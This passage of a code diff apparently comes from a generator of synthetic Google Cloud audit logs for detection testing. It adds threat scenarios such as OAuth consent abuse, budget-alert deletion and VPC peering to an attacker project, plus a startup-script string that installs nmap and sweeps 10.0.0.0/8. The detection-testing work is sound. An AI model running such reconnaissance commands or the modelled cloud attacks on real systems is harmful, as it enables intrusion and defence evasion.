+        "#!/bin/bash\\napt-get install -y nmap && nmap -sn 10.0.0.0/8",
+    ]
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "compute.googleapis.com",
+        method_name     = "v1.compute.instances.insert",
+        resource_name   = f"projects/{project_id}/zones/{zone}/instances/{instance_name}",
+        resource_type   = "gce_instance",
+        resource_labels = {"project_id": project_id, "instance_id": instance_id, "zone": zone},
+        log_type        = _LOG_ACTIVITY,
+        operation_id    = op_id,
+        operation_last  = False,
+        request_body    = {
+            "name": instance_name,
+            "machineType": f"projects/{project_id}/zones/{zone}/machineTypes/{machine_type}",
+            "disks": [{
+                "boot": True,
+                "initializeParams": {
+                    "sourceImage": "projects/debian-cloud/global/images/debian-12-bookworm-v20240312",
+                    "diskSizeGb": "200",
+                },
+            }],
+            "networkInterfaces": [{
+                "network": f"projects/{project_id}/global/networks/default",
+                "accessConfigs": [{"type": "ONE_TO_ONE_NAT", "name": "External NAT"}],
+            }],
+            "metadata": {
+                "items": [{"key": "startup-script", "value": random.choice(startup_scripts)}],
+            },
+            "serviceAccounts": [{
+                "email": f"default@{project_id}.iam.gserviceaccount.com",
+                "scopes": ["https://www.googleapis.com/auth/cloud-platform"],
+            }],
+        },
+        response_body = {
+            "targetLink": f"https://www.googleapis.com/compute/v1/projects/{project_id}/zones/{zone}/instances/{instance_name}",
+            "status": "RUNNING",
+            "targetId": instance_id,
+        },
+    )
+
+    # LRO completion event — same operation_id, first=False, last=True
+    entry_done = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "compute.googleapis.com",
+        method_name     = "v1.compute.instances.insert",
+        resource_name   = f"projects/{project_id}/zones/{zone}/instances/{instance_name}",
+        resource_type   = "gce_instance",
+        resource_labels = {"project_id": project_id, "instance_id": instance_id, "zone": zone},
+        log_type        = _LOG_ACTIVITY,
+        operation_id    = op_id,
+        operation_first = False,
+        operation_last  = True,
+        offset_seconds  = random.randint(5, 30),
+        response_body   = {
+            "targetLink": f"https://www.googleapis.com/compute/v1/projects/{project_id}/zones/{zone}/instances/{instance_name}",
+            "status": "DONE",
+            "targetId": instance_id,
+        },
+    )
+    return [entry, entry_done]
+
+
 def _gen_cloud_armor_delete(config, context=None):
     """
     THREAT: Delete a Cloud Armor WAF security policy.
@@ -2601,6 +3258,7 @@ def _gen_cloud_armor_delete(config, context=None):
     p = _get_random_principal(config, context)
     project_id = _get_project_id(config)
     policy = _get_random_cloud_armor_policy(config)
+    op_id = f"operation-{uuid.uuid4().hex[:12]}-{uuid.uuid4().hex[:8]}"
 
     entry = _build_log_entry(
         project_id      = project_id,
@@ -2612,6 +3270,8 @@ def _gen_cloud_armor_delete(config, context=None):
         resource_type   = "project",
         resource_labels = {},
         log_type        = _LOG_ACTIVITY,
+        operation_id    = op_id,
+        operation_last  = False,
         request_body    = {"project": project_id, "securityPolicy": policy},
     )
     return [entry]
@@ -2627,6 +3287,7 @@ def _gen_vpc_peering_backdoor(config, context=None):
     network = _get_random_vpc_network(config)
     external_project = f"attacker-proj-{''.join(random.choices('0123456789', k=7))}"
     external_network = f"projects/{external_project}/global/networks/default"
+    op_id = f"operation-{uuid.uuid4().hex[:12]}-{uuid.uuid4().hex[:8]}"
 
     entry = _build_log_entry(
         project_id      = project_id,
@@ -2638,6 +3299,8 @@ def _gen_vpc_peering_backdoor(config, context=None):
         resource_type   = "gce_network",
         resource_labels = {"network_id": str(random.randint(100000000000000000, 999999999999999999))},
         log_type        = _LOG_ACTIVITY,
+        operation_id    = op_id,
+        operation_last  = False,
         request_body    = {
             "project": project_id,
             "network": network,
@@ -3282,7 +3945,7 @@ def _gen_admin_role_granted(config, context=None):
         principal_email = p['email'],
         caller_ip       = p['caller_ip'],
         service_name    = "cloudresourcemanager.googleapis.com",
-        method_name     = "SetIamPolicy",
+        method_name     = "google.iam.v1.IAMPolicy.SetIamPolicy",
         resource_name   = f"projects/{project_id}",
         resource_type   = "project",
         resource_labels = {},
@@ -3332,8 +3995,8 @@ def _gen_logging_sink_delete(config, context=None):
         service_name    = "logging.googleapis.com",
         method_name     = "google.logging.v2.ConfigServiceV2.DeleteSink",
         resource_name   = f"projects/{project_id}/sinks/{sink_name}",
-        resource_type   = "project",
-        resource_labels = {"project_id": project_id},
+        resource_type   = "logging_sink",
+        resource_labels = {"project_id": project_id, "name": sink_name, "destination": ""},
         log_type        = _LOG_ACTIVITY,
         request_body    = {"sinkName": f"projects/{project_id}/sinks/{sink_name}"},
     )
@@ -3358,8 +4021,8 @@ def _gen_logging_sink_modify(config, context=None):
         service_name    = "logging.googleapis.com",
         method_name     = "google.logging.v2.ConfigServiceV2.UpdateSink",
         resource_name   = f"projects/{project_id}/sinks/{sink_name}",
-        resource_type   = "project",
-        resource_labels = {"project_id": project_id},
+        resource_type   = "logging_sink",
+        resource_labels = {"project_id": project_id, "name": sink_name, "destination": ""},
         log_type        = _LOG_ACTIVITY,
         request_body    = {
             "sinkName":   f"projects/{project_id}/sinks/{sink_name}",
@@ -3396,6 +4059,7 @@ def _gen_firewall_rule_modify(config, context=None):
     project_id = _get_project_id(config)
     rule_name  = _get_random_firewall_rule(config)
     firewall_rule_id = str(random.randint(100000000000000000, 999999999999999999))
+    op_id = f"operation-{uuid.uuid4().hex[:12]}-{uuid.uuid4().hex[:8]}"
 
     variant = random.choice(["open_sources", "add_ports", "lower_priority"])
 
@@ -3432,6 +4096,8 @@ def _gen_firewall_rule_modify(config, context=None):
         resource_type   = "gce_firewall_rule",
         resource_labels = {"firewall_rule_id": firewall_rule_id},
         log_type        = _LOG_ACTIVITY,
+        operation_id    = op_id,
+        operation_last  = False,
         request_body    = {
             "project":          project_id,
             "firewall":         rule_name,
@@ -3452,6 +4118,7 @@ def _gen_firewall_rule_delete(config, context=None):
     project_id = _get_project_id(config)
     rule_name = _get_random_firewall_rule(config)
     firewall_rule_id = str(random.randint(100000000000000000, 999999999999999999))
+    op_id = f"operation-{uuid.uuid4().hex[:12]}-{uuid.uuid4().hex[:8]}"
 
     entry = _build_log_entry(
         project_id      = project_id,
@@ -3463,6 +4130,8 @@ def _gen_firewall_rule_delete(config, context=None):
         resource_type   = "gce_firewall_rule",
         resource_labels = {"firewall_rule_id": firewall_rule_id},
         log_type        = _LOG_ACTIVITY,
+        operation_id    = op_id,
+        operation_last  = False,
         request_body    = {"project": project_id, "firewall": rule_name},
     )
     return [entry]
@@ -3658,7 +4327,7 @@ def _gen_sensitive_role_to_group(config, context=None):
         principal_email = p['email'],
         caller_ip       = p['caller_ip'],
         service_name    = "cloudresourcemanager.googleapis.com",
-        method_name     = "SetIamPolicy",
+        method_name     = "google.iam.v1.IAMPolicy.SetIamPolicy",
         resource_name   = f"projects/{project_id}",
         resource_type   = "project",
         resource_labels = {},
@@ -3794,7 +4463,7 @@ def _gen_secretmanager_self_grant(config, context=None):
         principal_email = email,
         caller_ip       = p['caller_ip'],
         service_name    = "cloudresourcemanager.googleapis.com",
-        method_name     = "SetIamPolicy",
+        method_name     = "google.iam.v1.IAMPolicy.SetIamPolicy",
         resource_name   = f"projects/{project_id}",
         resource_type   = "project",
         resource_labels = {},
@@ -3852,7 +4521,7 @@ def _gen_deploymentmanager_self_grant(config, context=None):
         principal_email = email,
         caller_ip       = p['caller_ip'],
         service_name    = "cloudresourcemanager.googleapis.com",
-        method_name     = "SetIamPolicy",
+        method_name     = "google.iam.v1.IAMPolicy.SetIamPolicy",
         resource_name   = f"projects/{project_id}",
         resource_type   = "project",
         resource_labels = {},
@@ -5142,6 +5811,83 @@ def _gen_gcs_lifecycle_tamper(config, context=None):
     return [entry]
 
 
+def _gen_oauth_consent_screen_abuse(config, context=None):
+    """
+    THREAT: Configure OAuth consent screen to "external" with broad scopes.
+
+    Enables phishing-based OAuth token theft by making the app consent screen
+    visible to all Google accounts and requesting sensitive API scopes.
+    MITRE: T1528 Steal Application Access Token / TA0006 Credential Access.
+    """
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+
+    dangerous_scopes = random.sample([
+        "https://www.googleapis.com/auth/gmail.readonly",
+        "https://www.googleapis.com/auth/drive",
+        "https://www.googleapis.com/auth/calendar",
+        "https://www.googleapis.com/auth/admin.directory.user.readonly",
+        "https://www.googleapis.com/auth/cloud-platform",
+        "https://www.googleapis.com/auth/contacts.readonly",
+    ], k=random.randint(3, 5))
+
+    app_name = random.choice([
+        "IT Security Scanner", "HR Benefits Portal", "Corporate SSO Helper",
+        "Admin Access Utility", "Account Recovery Tool",
+    ])
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "cloudresourcemanager.googleapis.com",
+        method_name     = "SetIamPolicy",
+        resource_name   = f"projects/{project_id}",
+        resource_type   = "project",
+        resource_labels = {"project_id": project_id},
+        log_type        = _LOG_ACTIVITY,
+        request_body    = {
+            "oauthBrand": {
+                "applicationTitle": app_name,
+                "userType":         "EXTERNAL",
+                "supportEmail":     p['email'],
+            },
+            "oauthScopes": dangerous_scopes,
+        },
+    )
+    return [entry]
+
+
+def _gen_budget_alert_delete(config, context=None):
+    """
+    THREAT: Delete a Cloud Billing budget alert — hide runaway spend.
+
+    Attacker removes budget notifications to prevent detection of
+    cryptomining or denial-of-wallet resource consumption.
+    MITRE: T1562 Impair Defenses / TA0005 Defense Evasion.
+    """
+    p = _get_random_principal(config, context)
+    project_id = _get_project_id(config)
+    billing_account = f"billingAccounts/{random.randint(100000, 999999)}-{random.randint(100000, 999999)}-{random.randint(100000, 999999)}"
+    budget_id = uuid.uuid4().hex[:16]
+
+    entry = _build_log_entry(
+        project_id      = project_id,
+        principal_email = p['email'],
+        caller_ip       = p['caller_ip'],
+        service_name    = "billingbudgets.googleapis.com",
+        method_name     = "google.cloud.billing.budgets.v1.BudgetService.DeleteBudget",
+        resource_name   = f"{billing_account}/budgets/{budget_id}",
+        resource_type   = "billing_budget",
+        resource_labels = {"project_id": project_id},
+        log_type        = _LOG_ACTIVITY,
+        request_body    = {
+            "name": f"{billing_account}/budgets/{budget_id}",
+        },
+    )
+    return [entry]
+
+
 # ---------------------------------------------------------------------------
 # Scenario Dictionaries
 # ---------------------------------------------------------------------------
@@ -5183,6 +5929,18 @@ BENIGN_SCENARIOS = {
     _gen_vertex_batch_predict:       4,
     # New event types (Step 9)
     _gen_create_service_account:     4,
+    # Workspace login baseline events
+    _gen_workspace_login_success:    10,  # High weight — login events are frequent
+    _gen_workspace_login_failure:     2,  # Occasional failures are normal
+    # Benign noise — occasional permission denied for realistic baselines
+    _gen_benign_permission_denied:    3,
+    # Dataproc, Scheduler, Tasks, Firestore benign ops
+    _gen_dataproc_list_clusters:      3,
+    _gen_dataproc_submit_job:         4,
+    _gen_cloud_scheduler_list_jobs:   3,
+    _gen_cloud_tasks_list_queues:     3,
+    _gen_firestore_list_documents:    6,
+    _gen_firestore_write:             5,
 }
 
 SUSPICIOUS_SCENARIOS = {
@@ -5270,6 +6028,12 @@ THREAT_SCENARIOS = {
     _gen_kms_key_version_disable:          3,
     _gen_cloudbuild_trigger_modify:        3,
     _gen_gcs_lifecycle_tamper:             2,
+    _gen_compute_instance_insert:          3,
+    _gen_sa_create_key_impersonate_chain:  3,
+    _gen_gcs_bulk_download_exfil:          3,
+    # OAuth / billing threat generators
+    _gen_oauth_consent_screen_abuse:       2,
+    _gen_budget_alert_delete:              2,
 }
 
 SCENARIO_FUNCTIONS = {
@@ -5350,6 +6114,11 @@ SCENARIO_FUNCTIONS = {
     "KMS_KEY_VERSION_DISABLE":           _gen_kms_key_version_disable,
     "CLOUDBUILD_TRIGGER_MODIFY":         _gen_cloudbuild_trigger_modify,
     "GCS_LIFECYCLE_TAMPER":              _gen_gcs_lifecycle_tamper,
+    "COMPUTE_INSTANCE_INSERT":           _gen_compute_instance_insert,
+    "SA_CREATE_KEY_IMPERSONATE_CHAIN":   _gen_sa_create_key_impersonate_chain,
+    "GCS_BULK_DOWNLOAD_EXFIL":           _gen_gcs_bulk_download_exfil,
+    "OAUTH_CONSENT_SCREEN_ABUSE":        _gen_oauth_consent_screen_abuse,
+    "BUDGET_ALERT_DELETE":               _gen_budget_alert_delete,
 }
 
 
